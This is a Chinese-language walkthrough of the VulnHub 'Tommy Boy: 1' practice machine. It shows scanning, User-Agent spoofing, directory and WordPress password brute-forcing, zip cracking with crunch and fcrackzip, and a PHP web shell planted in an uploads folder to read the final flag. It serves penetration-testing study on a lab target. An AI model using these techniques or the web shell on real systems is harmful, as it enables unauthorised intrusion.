[【甄选靶场】Vulnhub百个项目渗透——项目三十八：Tommy-Boy-1（修改UA，脏牛提权）_tommyboy1dot0靶机_人间体佐菲的博客-CSDN博客](https://blog.csdn.net/weixin_65527369/article/details/127307944)

[No.38-VulnHub-Tommy Boy: 1-Walkthrough渗透学习_大余xiyou的博客-CSDN博客](https://blog.csdn.net/qq_34801745/article/details/104124940)

[Vulnhub-靶机-Tommy Boy: 1 - 皇帽讲绿帽带法技巧 - 博客园 (cnblogs.com)](https://www.cnblogs.com/autopwn/p/13570922.html)

# 信息搜集

## 1、端口探测

```bash
nmap -p- -n -sC -sV 192.168.10.14 -oN tommyboy.nmap
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0ca62cef67eae8b62de0bdb213fb0d6 (RSA)
|   256 466d4b4b02868927285c1d8710553d59 (ECDSA)
|_  256 569e712aa383ff63117e9408dd281d46 (ED25519)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to Callahan Auto
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
8008/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: KEEP OUT
|_http-server-header: Apache/2.4.18 (Ubuntu)
65534/tcp open  ftp     ProFTPD 1.2.10
MAC Address: 00:0C:29:78:1E:39 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2、80端口探测

### robots.txt

<img src=".\图片\Snipaste_2023-08-20_20-36-49.png" alt="Snipaste_2023-08-20_20-36-49" style="zoom:80%;" />

手动测试 `/robots.txt`  

<img src=".\图片\Snipaste_2023-08-20_20-40-29.png" alt="Snipaste_2023-08-20_20-40-29" style="zoom:80%;" />

```http
http://192.168.10.14/flag-numero-uno.txt
```

```
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
```

### 查看源码

查看主页源码，发现有一个视频地址

<img src=".\图片\Snipaste_2023-08-20_20-42-05.png" alt="Snipaste_2023-08-20_20-42-05" style="zoom:80%;" />

根据网页源码发现一个 YouTube 视频网站 URL 地址，访问看看，发现一个关键字 `prehistoricforest`，这时候拼接到网站目录里看看，发现一个博客站点

<img src=".\图片\Snipaste_2023-08-20_20-44-18.png" alt="Snipaste_2023-08-20_20-44-18" style="zoom:80%;" />

## 观察网站具有意义信息

其中有一篇加密文章，我们先看看其它文章，这时候可以留意网站的意义，可以从博客的内容得到很多信息，比如有意义的文章或一些用户名信息，留心并把这些用户名**做成字典**。这里在一个评论处看到了 `Flag #2: thisisthesecondflagyayyou.txt`

<img src=".\图片\Snipaste_2023-08-20_20-49-35.png" alt="Snipaste_2023-08-20_20-49-35" style="zoom:80%;" />

拼接路径得到 第二个 flag

```http
http://192.168.10.14/prehistoricforest/thisisthesecondflagyayyou.txt
```

```
You've got 2 of five flags - keep it up!

Flag data: Z4l1nsky
```

又在网站的另一篇博客文章里找到了一个关键路径 `/richard`

<img src=".\图片\Snipaste_2023-08-20_20-52-51.png" alt="Snipaste_2023-08-20_20-52-51" style="zoom:80%;" />

一样把它拼接到网站路径里看看，得到一个图片

<img src=".\图片\Snipaste_2023-08-20_20-57-08.png" alt="Snipaste_2023-08-20_20-57-08" style="zoom:67%;" />

下载下来后，用 `strings` 或者 `exiftool` 命令查看有无关键隐藏的字符串

```
└─# exiftool shockedrichard.jpg 
或者
└─# strings shockedrichard.jpg | more
```

看似得到一个加密的字符串

```
ce154b5a8e59c89732bc25d6a2e6b90b
```

查看这是什么加密，`hash-identifier`，看似是 MD5

```bash
└─# hash-identifier ce154b5a8e59c89732bc25d6a2e6b90b
```

在线网站解密，得到明文 `spanky`。这里暂停下，这个明文可能是wp站点后台的面码，可能是 ssh 连接时某个用户的密码，当然也可能是以上加密博客的密码。事实验证后，以上猜想最后一个是正确的。

查看加密博客，英文看不懂就直接翻译

<img src=".\图片\Snipaste_2023-08-20_21-13-10.png" alt="Snipaste_2023-08-20_21-13-10" style="zoom:80%;" />

以上信息，具体有 `callahanbak.bak` 备份、 ftp 连接等

## ftp

紧接上文，联系之前 nmap 端口探测的信息，发现 `65534` 端口为 ftp，用户名为 `nickburns`，密码为弱口令

这时候停以下，思考并留心，账号和密码很可能为同一个吧！如果这时候无脑 hydra 并上字典 rockyou.txt，那么肯定失败啦

这里还补充下，以下加密博客的信息还透露出可能 ftp 端口是开15 分钟停15 分钟的，这个则没办只能等

```bash
└─# ftp 192.168.10.14 65534
Connected to 192.168.10.14.
220 Callahan_FTP_Server 1.3.5
Name (192.168.10.14:root): nickburns
331 Password required for nickburns
Password: 
230 User nickburns logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Type set to I
ftp> ls
229 Entering Extended Passive Mode (|||8136|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
226 Transfer complete
ftp> get readme.txt
local: readme.txt remote: readme.txt
229 Entering Extended Passive Mode (|||7145|)
150 Opening BINARY mode data connection for readme.txt (977 bytes)
100% |********************************************************************************************************************|   977       13.70 MiB/s    00:00 ETA
226 Transfer complete
977 bytes received in 00:00 (333.71 KiB/s)
ftp> exit
221 Goodbye.
```

得到 `readme.txt` 并下载查看

```bash
└─# cat readme.txt 
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```

阅读信息，得知 `NickIzL33t` 为一个目录，里面可能有 `Big Tom` 的密码信息，于是查看 `/NickIzL33t` ，`80` 端口没有，尝试访问 `8008`  端口。

# web打点

## 8008端口

紧接上文，查看网站信息

<img src=".\图片\Snipaste_2023-08-20_21-37-21.png" alt="Snipaste_2023-08-20_21-37-21" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-20_21-37-31.png" alt="Snipaste_2023-08-20_21-37-31" style="zoom:80%;" />

在这里停下思考，乔布斯啊，iphone啊。根据提示限制了 `user-agent`，只允许 iPhone手 机的 UA头 可以访问对应的内容

于是可用 firefox 插件修改 UA 头 为 iphone，再查看

<img src=".\图片\Snipaste_2023-08-20_21-43-29.png" alt="Snipaste_2023-08-20_21-43-29" style="zoom:80%;" />

那么 网站目录爆破吧，这个有告诉我们有一个隐藏的 html 文件，指定后缀为 .html

```bash
└─# dirb http://192.168.10.14:8008/NickIzL33t/ web.dic -a "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/13C71 Safari/601.1.46" -X .html
```

```http
 http://192.168.10.14:8008/NickIzL33t/fallon1.html
```

<img src=".\图片\Snipaste_2023-08-20_21-54-11.png" alt="Snipaste_2023-08-20_21-54-11" style="zoom:80%;" />

得到第三个 flag

```
THREE OF 5 FLAGS - you're awesome sauce.

Flag data: TinyHead
```

并根据以上两个链接提示，得到了一个加密的 `t0msp4ssw0rdz.zip` 文件，要根据一定的规则去生成密码字典，然后爆破

```
Big Tom,

Your password vault is protected with (yep, you guessed it) a PASSWORD!  
And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!

Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters

Yeah, fat man, that's a lot of keys to push but make sure you type them altogether in one 
big chunk ok?  Heh, "big chunk."  A big chunk typing big chunks.  That's funny.

LOL

-Nick

```

```bash
curl --user-agent "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20" -v http://192.168.10.14:8008/NickIzL33t/t0msp4ssw0rdz.zip -o t0msp4ssw0rdz.zip
```

## 爆破zip

使用 `crunch` 给定模式生成字典列表…[crunch学习链接](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/)

```bash
crunch 13 13 -t bev,%%@@^1995 -o passlist_tomboy.txt
```

`fcrackzip` 爆破压缩包

```bash
└─# fcrackzip -v -D -u -p passlist_tomboy.txt t0msp4ssw0rdz.zip 
```

得到密码 `bevH00tr$1995`

查看解压后的密码信息

```bash
└─# cat passwords.txt                                                                                                                                      130 ⨯
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

得到一串用户名密码

这里发现  `fatguyinalittlecoat`  只是 密码的一部分，此时的信息可能跟之前的 web 访问页面 WordPress 有关

## 枚举进wp后台

紧接上文，枚举进 wp 后台

使用 wpscan 进行扫描探测存在哪些用户名

```bash
wpscan --url http://192.168.10.14/prehistoricforest -P /usr/share/wordlists/rockyou.txt -U tom 
```

探测出来用户名是 `tom` 密码为 `tomtom1`

进入之后发现发件箱有一封邮件

<img src=".\图片\Snipaste_2023-08-20_22-15-28.png" alt="Snipaste_2023-08-20_22-15-28" style="zoom:80%;" />

发现密码的后几位为 `1938!!`

对比前面解密压缩包的文件信息，得到账号密码

```
 bigtommysenior:fatguyinalittlecoat1938!!
```

# SSH登录

紧接上文，用 `bigtommysenior:fatguyinalittlecoat1938!!` 来 SSH 登录

```bash
└─# ssh bigtommysenior@192.168.10.14

bigtommysenior@CallahanAutoSrv01:~$ pwd
/home/bigtommysenior
bigtommysenior@CallahanAutoSrv01:~$ cd /
bigtommysenior@CallahanAutoSrv01:/$ ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
bigtommysenior@CallahanAutoSrv01:/$ ls -al
total 105
drwxr-xr-x  25 root     root      4096 Jul 15  2016 .
drwxr-xr-x  25 root     root      4096 Jul 15  2016 ..
-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
drwxr-xr-x   2 root     root      4096 Jul  6  2016 bin
drwxr-xr-x   4 root     root      1024 Jul 14  2016 boot
drwxr-xr-x  20 root     root      4300 Aug 20  2023 dev
drwxr-xr-x  92 root     root      4096 Jul 21  2016 etc
drwxr-xr-x   5 root     root      4096 Jul  7  2016 home
lrwxrwxrwx   1 root     root        32 Jul 14  2016 initrd.img -> boot/initrd.img-4.4.0-31-generic
lrwxrwxrwx   1 root     root        32 Jul  6  2016 initrd.img.old -> boot/initrd.img-4.4.0-28-generic
drwxr-xr-x  22 root     root      4096 Jul  6  2016 lib
drwxr-xr-x   2 root     root      4096 Jul  6  2016 lib32
drwxr-xr-x   2 root     root      4096 Jul  6  2016 lib64
drwxr-xr-x   2 root     root      4096 Jul  6  2016 libx32
drwx------   2 root     root     16384 Jul  6  2016 lost+found
drwxr-xr-x   3 root     root      4096 Jul  6  2016 media
drwxr-xr-x   2 root     root      4096 Apr 20  2016 mnt
drwxr-xr-x   2 root     root      4096 Apr 20  2016 opt
dr-xr-xr-x 203 root     root         0 Aug 20  2023 proc
drwx------   3 root     root      4096 Aug 20  2023 root
drwxr-xr-x  26 root     root       920 Aug 20 09:18 run
drwxr-xr-x   2 root     root     12288 Jul  6  2016 sbin
drwxr-xr-x   2 root     root      4096 Apr 19  2016 snap
drwxr-xr-x   2 root     root      4096 Apr 20  2016 srv
dr-xr-xr-x  13 root     root         0 Aug 20  2023 sys
drwxrwxrwt   9 root     root      4096 Aug 20 09:17 tmp
drwxr-xr-x  12 root     root      4096 Jul  6  2016 usr
drwxr-xr-x  15 root     root      4096 Jul 14  2016 var
lrwxrwxrwx   1 root     root        29 Jul 14  2016 vmlinuz -> boot/vmlinuz-4.4.0-31-generic
lrwxrwxrwx   1 root     root        29 Jul  6  2016 vmlinuz.old -> boot/vmlinuz-4.4.0-28-generic
```

找到 flag4

```bash
bigtommysenior@CallahanAutoSrv01:/$ cd
bigtommysenior@CallahanAutoSrv01:~$ ls
callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP
bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?  

I'll make it easy on you.  It's in the root of this server at /5.txt
```

查看根目录，发现根目录有个 `.5.txt` ，需要 `www-data` 的权限，也就是降权才能查看

```
-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
```

# 降权查看flag5

此时去看看网站的根目录，翻到一个 uploads 文件夹，而且权限是全局都有的

那么我直接在此文件夹下创建一个 shell.php 然后代码是`<?php phpinfo(); system($_GET[x]); ?>` 然后在web浏览器上执行

```php
<?php phpinfo(); system($_GET[x]); ?>
```

```http
http://192.168.10.14:8008/NickIzL33t/P4TCH_4D4MS/uploads/shell.php?x=cat%20/.5.txt
```

<img src=".\图片\Snipaste_2023-08-20_22-43-13.png" alt="Snipaste_2023-08-20_22-43-13" style="zoom:80%;" />

得到第 5 个 flag

```
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!! OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!! Flag data: Buttcrack Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk. So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you" you would create this blob: hithereyou Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's folder and you can call the box PWNED. 
```

# 召唤神龙

前面已经知道在 `bigtommysenior` 用户下还存在一个 `LOOT.ZIP` 未解开…

```
flag1：B34rcl4ws
flag2：Z4l1nsky
flag3：TinyHead
flag4：EditButton
flag5：Buttcrack
```

密码： `B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack`

```bash
bigtommysenior@CallahanAutoSrv01:~$ ls
callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP
bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP 
Archive:  LOOT.ZIP
[LOOT.ZIP] THE-END.txt password: 
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~$ ls
callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP  THE-END.txt
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security
```

# 总结

- `exiftool` 工具可查看文件的基本信息
- `/robots.txt` 里找到的第一个 flag，根据网站里有意义的信息得到第二个flag，根据指定后缀名网站目录爆破得到第三flag，根据 wp 后台里的信息找到第四个 flag，根据降权到 www-data 权限得到第五个flag
- 这个靶场特别的一点是有剧情的，像一个游戏也是有剧情的。我们可以暂时抛开脑子里的 owasp-top10漏洞。原汁原味从目标网站出发，感受这个网站是干嘛的，会不会不经意间流露出一些公司内部信息，根据这些信息（剧情）一步一步的走，看看会不会有惊喜
- 爆破 zip ，工具 `fcrackzip`
- 生成特殊规则的字典，工具 `crunch`
- 当一个网站做出了限制，普通人访问和内部人访问得到的结果不同，这时候可以试试修改请求头里的参数，如 UA 头、Referer字段等


